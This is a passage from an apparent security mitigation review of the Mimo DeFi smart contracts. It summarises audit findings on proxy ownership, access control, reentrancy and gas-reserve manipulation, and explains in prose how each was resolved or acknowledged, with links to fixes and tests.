<code>MIMOProxyRegistry</code> stored proxy ownership data, but ownership transfers were not propagated from <code>MIMOProxy</code> to the <code>MIMOProxyRegistry</code>. This would cause new owners to lose access to vault funds and old owners to retain privileged access to automation configuration.</p>\n<p><strong>What changed:</strong> The Mimo team removed the <code>owner</code> state variable and <code>transferOwner</code> function from <code>MIMOProxy</code>. Additionally, they removed <code>MIMOProxyRegistry</code> altogether and moved its functionality to <code>MIMOProxyFactory</code>. Ownership data is now stored only in <code>MIMOProxyFactory</code>, and all ownership transfers must now be performed by calling <code>MIMOProxyFactory#transferOwnership</code> rather than interacting with <code>MIMOProxy</code>.</p>\n<p><code>MIMOProxyFactory</code> now stores <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/contracts/proxy/MIMOProxyFactory.sol#L20\">a mapping</a> of proxy address to <code>ProxyState</code>, a struct that includes the current owner address. The <code>claimOwnership</code> function updates both <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/contracts/proxy/MIMOProxyFactory.sol#L105\">the owner address</a>  and the <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/contracts/proxy/MIMOProxyFactory.sol#L104\">current proxy</a> when a new user accepts ownership. A <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/test/01_unit/proxy/MIMOProxyFactory.test.ts#L89\">unit test</a> demonstrates this behavior.</p>\n<p>An <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/51a3092e4dd62f36de8fb16d15f5dec756cc9ae0/test/02_integration/proxy/MIMOProxyGuard.test.ts\">integration test</a> demonstrates that proxy permissions are cleared after ownership transfers.</p>\n<p>In its authorization check in the <code>execute</code> function, <code>MIMOProxy</code> <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/contracts/proxy/MIMOProxy.sol#L38\">reads from the proxy factory</a> to determine the <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/contracts/proxy/MIMOProxy.sol#L41\">current owner address</a>. Client contracts <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/contracts/actions/MIMOEmptyVault.sol#L74\">MIMOEmptyVault</a>, <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/contracts/actions/MIMOLeverage.sol#L79\">MIMOLeverage</a>, <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/contracts/actions/MIMORebalance.sol#L76\">MIMORebalance</a>, <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/contracts/actions/automated/MIMOAutoAction.sol#L37\">MIMOAutoAction</a>, and <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/contracts/actions/managed/MIMOManagedAction.sol#L36\">MIMOManagedAction</a> now read the current proxy from <code>MIMOProxyFactory</code>. </p>\n<p><strong>Why it works:</strong> Since <code>MIMOProxyFactory</code> is now the single source of truth for <code>MIMOProxy</code> ownership, this data cannot fall out of sync across contracts. Since client contracts call <code>MIMOProxyFactory#getCurrentProxy</code>, they will correctly read the current proxy address.</p>\n<h3 id=\"h-04-incorrect-implementation-of-access-control-in-mimoproxyexecute-1\" style=\"position:relative;\"><a href=\"#h-04-incorrect-implementation-of-access-control-in-mimoproxyexecute-1\" aria-label=\"h 04 incorrect implementation of access control in mimoproxyexecute 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[H-04] <strong>Incorrect implementation of access control in MIMOProxy:execute</strong></h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/159\">Github Issue</a></p>\n<p><strong>Status:</strong> ✅ Resolved</p>\n<p><strong>Finding:</strong> A warden identified that callers could bypass a permissions check in <code>MIMOProxy#execute</code> by passing specially constructed calldata, enabling the caller to invoke a contract’s fallback function.</p>\n<p><strong>What changed:</strong> <code>MIMOProxy#execute</code> now reads the first four bytes of the <code>data</code> parameter directly rather than using <code>data.offset</code> to extract the function selector from calldata. </p>\n<p><strong>Why it works:</strong> Since attackers can no longer manipulate the extracted selector, they cannot bypass the permissions check. A <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/test/01_unit/proxy/MIMOProxy.test.ts#L103\">unit test</a> demonstrates this behavior.</p>\n<h3 id=\"m-01-vault-rebalancing-can-be-exploited-if-two-vaults-rebalance-into-the-same-vault-1\" style=\"position:relative;\"><a href=\"#m-01-vault-rebalancing-can-be-exploited-if-two-vaults-rebalance-into-the-same-vault-1\" aria-label=\"m 01 vault rebalancing can be exploited if two vaults rebalance into the same vault 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[M-01] <strong>Vault rebalancing can be exploited if two vaults rebalance into the same vault</strong></h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/39\">Github Issue</a></p>\n<p><strong>Status:</strong> ✅ Resolved</p>\n<p><strong>Finding:</strong> Wardens identified that <code>MIMOAutoRebalance#rebalance</code> was vulnerable to reentrancy by swapping through a malicious token that transfers control to the caller.</p>\n<p><strong>What changed:</strong> The Mimo team added a <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/contracts/actions/automated/MIMOAutoRebalance.sol#L59\">reentrancy guard</a> to the <code>rebalance</code> function. An <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/test/02_integration/automated/MIMOAutoActionSecurity.test.ts#L137\">integration test</a> demonstrates that the function is protected against reentrancy.</p>\n<p><strong>Why it works:</strong> Since <code>rebalance</code> is protected by a reentrancy guard, attempts to reenter <code>rebalance</code> will now revert.</p>\n<h3 id=\"m-02-malicious-targets-can-manipulate-mimoproxy-permissions-1\" style=\"position:relative;\"><a href=\"#m-02-malicious-targets-can-manipulate-mimoproxy-permissions-1\" aria-label=\"m 02 malicious targets can manipulate mimoproxy permissions 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[M-02] <strong>Malicious targets can manipulate MIMOProxy permissions</strong></h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/161\">Github Issue</a></p>\n<p><strong>Status:</strong> ✅ Resolved</p>\n<p><strong>Finding:</strong> Wardens identified that malicious target contracts could manipulate storage variables in <code>MIMOProxy</code>, including the contract’s <code>_initialized</code> and <code>_initializing</code> state variables and permissions granted to external “envoys.”</p>\n<p><strong>What changed:</strong> The Mimo team have removed all storage variables from <code>MIMOProxy</code>:</p>\n<ul>\n<li>The <code>MIMOProxy</code> contract is no longer <code>Initializable</code>, removing <code>_initialized</code> and <code>_initializing</code>.</li>\n<li>Proxy owner is now stored in <code>MIMOProxyFactory</code>, removing <code>owner</code>.</li>\n<li>Minimum gas reserve is now stored in <code>MIMOProxyFactory</code>, removing <code>minGasReserve</code>.</li>\n<li>Permissions are now stored in a separate <code>MIMOProxyGuard</code> contract, removing the <code>_permissions</code> mapping.</li>\n</ul>\n<p><strong>Why it works:</strong> Since <code>MIMOProxy</code> no longer includes any storage variables, they cannot be maliciously manipulated by <code>delegatecall</code> to target contracts.</p>\n<h3 id=\"m-03-malicious-manipulation-of-gas-reserve-can-deny-access-to-mimoproxy-1\" style=\"position:relative;\"><a href=\"#m-03-malicious-manipulation-of-gas-reserve-can-deny-access-to-mimoproxy-1\" aria-label=\"m 03 malicious manipulation of gas reserve can deny access to mimoproxy 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[M-03] <strong>Malicious manipulation of gas reserve can deny access to MIMOProxy</strong></h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/158\">Github Issue</a></p>\n<p><strong>Status:</strong> ✅ Resolved</p>\n<p><strong>Finding:</strong> Wardens identified that users could lose access to their <code>MIMOProxy</code> by setting a high minimum gas reserve using <code>delegatecall</code>.</p>\n<p><strong>What changed:</strong> The minimum gas reserve by proxy address is now stored in the <code>_proxyStates</code> mapping in <code>MIMOProxyFactory</code>. The proxy owner may update the minimum gas reserve value for their proxy by calling the <code>setMinGas</code> function. This behavior is demonstrated by a unit test <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/test/01_unit/proxy/MIMOProxyFactory.test.ts#L204\">here</a>.</p>\n<p>Only the owner may call <code>setMinGas</code>. Authorization behavior is demonstrated by a unit test <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/test/01_unit/proxy/MIMOProxyFactory.test.ts#L215\">here</a>.</p>\n<p><strong>Why it works:</strong> Since <code>minGasReserve</code> is no longer stored in <code>MIMOProxy</code> storage, it cannot be manipulated as described in the original finding.</p>\n<h3 id=\"m-04-persisted-msgvalue-in-a-loop-of-delegate-calls-can-be-used-to-drain-eth-from-your-proxy-1\" style=\"position:relative;\"><a href=\"#m-04-persisted-msgvalue-in-a-loop-of-delegate-calls-can-be-used-to-drain-eth-from-your-proxy-1\" aria-label=\"m 04 persisted msgvalue in a loop of delegate calls can be used to drain eth from your proxy 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[M-04] <strong>Persisted msg.value in a loop of delegate calls can be used to drain ETH from your proxy</strong></h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/153\">Github Issue</a></p>\n<p><strong>Status:</strong> 👍 Acknowledged</p>\n<p><strong>Finding:</strong> Wardens identified that calling <code>payable</code> functions via <code>BoringBatchable#batch</code> could lead to double spends or reuse of <code>msg.value</code>.</p>\n<p><strong>What changed:</strong> The Mimo team have acknowledged the risk of <code>payable</code> calls to <code>BoringBatchable#batch</code>. </p>\n<p><strong>Acknowledgment</strong>:</p>\n<blockquote>\n<p>In no normal usage of the <code>MIMOProxy</code> should there ever be ETH stuck in the contract.<br>\nIn the future, we might need <code>batch</code> to be <code>payable</code>. For example, our main protocol supports calls such as <code>depositETH</code> and <code>depositETHAndBorrow</code>, which do we want to work with the <code>MIMOProxy</code>. </p>\n</blockquote>\n<h3 id=\"m-05-mimomanagedrebalancesolrebalance-calculates-managerfee-incorrectly-1\" style=\"position:relative;\"><a href=\"#m-05-mimomanagedrebalancesolrebalance-calculates-managerfee-incorrectly-1\" aria-label=\"m 05 mimomanagedrebalancesolrebalance calculates managerfee incorrectly 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[M-05] <strong>MIMOManagedRebalance.sol#rebalance calculates managerFee incorrectly</strong></h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/34\">Github Issue</a></p>\n<p><strong>Status:</strong> ✅ Resolved</p>\n<p><strong>Finding:</strong> A warden identified that the variable portion of manager fees in <code>MIMOManagedRebalance</code> was calculated incorrectly, based on the amount of the rebalance flash loan denominated in the collateral asset rather than the amount of the rebalance denominated in PAR.</p>\n<p><strong>What changed:</strong> The Mimo team updated the <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/contracts/actions/managed/MIMOManagedRebalance.sol#L61\">fee calculation</a> to calculate the rebalance amount in PAR using a price feed.</p>\n<p><strong>Why it works:</strong> Since the rebalance amount is now denominated in PAR, it no longer fluctuates in terms of the collateral asset. </p>\n<h3 id=\"m-06-proxyfactory-can-circumvent-proxyregistry-1\" style=\"position:relative;\"><a href=\"#m-06-proxyfactory-can-circumvent-proxyregistry-1\" aria-label=\"m 06 proxyfactory can circumvent proxyregistry 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[M-06] <strong>ProxyFactory can circumvent ProxyRegistry</strong></h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/123\">Github Issue</a></p>\n<p><strong>Status:</strong> ✅ Resolved</p>\n<p><strong>Finding:</strong> Wardens identified that proxies could be deployed directly from the <code>MIMOProxyFactory</code> without being registered with the <code>MIMOProxyRegistry</code>.</p>\n<p><strong>What changed:</strong> The <code>ProxyRegistry</code> contract has been removed, and registration functionality is now included in <code>MIMOProxyFactory</code>.<br></p>\n<p>The <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/contracts/proxy/MIMOProxyFactory.sol#L47\">only mechanism</a> for deploying a proxy is now to call <code>MIMOProxyFactory#deploy</code>.</p>\n<p><strong>Why it works:</strong> Since there is only one code path to deploy a <code>MIMOProxy</code> and <code>MIMOProxyFactory</code> is the single source of truth for proxy registration, it is no longer possible to deploy an unregistered proxy as described in the finding. </p>\n<h3 id=\"m-07-vault-owner-can-front-run-rebalance-to-lower-incentives\" style=\"position:relative;\"><a href=\"#m-07-vault-owner-can-front-run-rebalance-to-lower-incentives\" aria-label=\"m 07 vault owner can front run rebalance to lower incentives permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[M-07] Vault owner can front run rebalance to lower incentives</h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/134\">Github Issue</a></p>\n<p><strong>Status:</strong> 👍 Acknowledged</p>\n<p><strong>Finding:</strong> A warden identified that a malicious vault owner could frontrun automated calls to <code>MIMOAutoRebalance#rebalance</code> and reconfigure their automated vault with a reduced incentive fee.</p>\n<p><strong>What changed:</strong> The Mimo team have acknowledged the finding.</p>\n<p><strong>Acknowledgement:</strong></p>\n<blockquote>\n<p>We’ve decided against fixing this in the end.</p>\n<p>The only potential loser is a keeper/automator that gets frontrun and does not get the reward they thought they would get and thus paid a gas fee that was not covered by the reward. We feel keepers are advanced enough to hide their txs from the mempool and that they’re also smart enough to let the tx revert if it does not yield a profit. For legit users of the protocol this has no impact whatsoever IMO.</p>\n<p>We also feel a timelock wouldn’t have been enough of a mitigation and might hurt legitimate use of the protocol.</p>\n</blockquote>\n<h3 id=\"m-08-if-a-mimoproxy-owner-destroys-their-proxy-they-cannot-deploy-another-from-the-same-address-1\" style=\"position:relative;\"><a href=\"#m-08-if-a-mimoproxy-owner-destroys-their-proxy-they-cannot-deploy-another-from-the-same-address-1\" aria-label=\"m 08 if a mimoproxy owner destroys their proxy they cannot deploy another from the same address 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[M-08] If a MIMOProxy owner destroys their proxy, they cannot deploy another from the same address</h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/162\">Github Issue</a></p>\n<p><strong>Status:</strong> ✅ Resolved</p>\n<p><strong>Finding:</strong> A warden identified that if a <code>MIMOProxy</code> owner destroys their proxy by calling selfdestruct, they cannot deploy another from the same address.</p>\n<p><strong>What changed:</strong> The Mimo team added <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5a63c76ed74186d11d3adb361d3b3aacefa7795e/contracts/proxy/MIMOProxyFactory.sol#L50\">a check</a> for the current proxy’s codesize in <code>MIMOProxyFactory#deploy</code>. If the proxy has been destroyed it is will be deleted from the <code>_proxyStates</code> mapping and a new proxy can be deployed. A <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5a63c76ed74186d11d3adb361d3b3aacefa7795e/test/01_unit/proxy/MIMOProxyFactory.test.ts#L230\">unit test</a> demonstrates this behavior.</p>\n<p><strong>Why it works:</strong> Since a proxy’s codesize will be zero when it has been destroyed, and cannot be zero otherwise, this check will allow the owner of a destroyed proxy to deploy another.</p>\n<h2 id=\"findings\" style=\"position:relative;\"><a href=\"#findings\" aria-label=\"findings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Findings</h2>\n<p>The following is an overview of the issues identified during the mitigation review as well as the related resolutions.</p>\n<h3 id=\"mh-01-missing-check-for-uninitialized-vault-in-mimomanagedactionsetmanagement\" style=\"position:relative;\"><a href=\"#mh-01-missing-check-for-uninitialized-vault-in-mimomanagedactionsetmanagement\" aria-label=\"mh 01 missing check for uninitialized vault in mimomanagedactionsetmanagement permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[M.H-01] Missing check for uninitialized vault in <code>MIMOManagedAction#setManagement</code></h3>\n<p><strong>Status:</strong> ✅ Resolved</p>\n<p><strong>Finding:</strong> Remediation of issue H-02 is incomplete: the same ownership check added to <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/contracts/actions/automated/MIMOAutoAction.sol#L34\">MIMOAutoAction#setManagement</a> should be added to <code>MIMOManagedAction#setManagement</code> to prevent setting management parameters for an uninitialized vault.</p>\n<p><strong>Recommendation:</strong> Add the same zero address check in <code>MIMOAutoAction#setManagement</code> to <code>MIMOManagedAction#setManagement</code>.</p>\n<p><strong>Fix:</strong> Resolved by adding a <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5a63c76ed74186d11d3adb361d3b3aacefa7795e/contracts/actions/managed/MIMOManagedAction.sol#L37\">zero address check</a> in commit <a href=\"https://github.com/mimo-capital/2022-08-mimo/pull/1/commits/5a63c76ed74186d11d3adb361d3b3aacefa7795e\"><code>5a63c76e</code></a>.</p>\n<h3 id=\"mm-01-missing-whennotpaused-modifier-on-flash-loan-callbacks\" style=\"position:relative;\"><a href=\"#mm-01-missing-whennotpaused-modifier-on-flash-loan-callbacks\" aria-label=\"mm 01 missing whennotpaused modifier on flash loan callbacks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[M.M-01] Missing <code>whenNotPaused</code> modifier on flash loan callbacks</h3>\n<p><strong>Status:</strong> ✅ Resolved</p>\n<p><strong>Finding:</strong> The <code>whenNotPaused</code> modifier has been added to the <code>executeOperation</code> flash loan callback in the action contracts <code>MIMOLeverage</code>, <code>MIMOEmptyVault</code>, and <code>MIMORebalance</code>, but it is missing from the <code>MIMOAutoRebalance</code> and <code>MIMOManagedRebalance</code> callbacks. </p>\n<p><strong>Recommendation:</strong> Add the <code>whenNotPaused</code> modifier to these functions.</p>\n<p><strong>Fix:</strong> Resolved by adding the <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/093f46e870cf22d12c373db37e361bf27fc97661/contracts/actions/automated/MIMOAutoRebalance.sol#L100\">missing</a> <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/093f46e870cf22d12c373db37e361bf27fc97661/contracts/actions/managed/MIMOManagedRebalance.sol\">modifiers</a> in commit <a href=\"https://github.com/mimo-capital/2022-08-mimo/pull/1/commits/093f46e870cf22d12c373db37e361bf27fc97661\"><code>093f46e8</code></a>.</p>\n<h3 id=\"mn-01-emit-events-in-mimopausable\" style=\"position:relative;\"><a href=\"#mn-01-emit-events-in-mimopausable\" aria-label=\"mn 01 emit events in mimopausable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[M.N-01] Emit events in <code>MIMOPausable</code></h3>\n<p><strong>Status:</strong> ✅ Resolved</p>\n<p><strong>Finding:</strong> The <code>MIMOPausable</code> contract does not emit events from the state-changing <code>pause</code> and <code>unpause</code> functions. </p>\n<p><strong>Recommendation</strong>: Emit <code>Paused(address)</code> and <code>Unpaused(address)</code> events from the <code>pause</code> and <code>unpause</code> functions. See OpenZeppelin’s <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol\">Pausable</a> implementation as an example.</p>\n<p><strong>Fix:</strong> Resolved by adding <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/093f46e870cf22d12c373db37e361bf27fc97661/contracts/actions/MIMOPausable.sol#L20\">events</a> in commit <a href=\"https://github.com/mimo-capital/2022-08-mimo/pull/1/commits/093f46e870cf22d12c373db37e361bf27fc97661\"><code>093f46e8</code></a>.</p>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 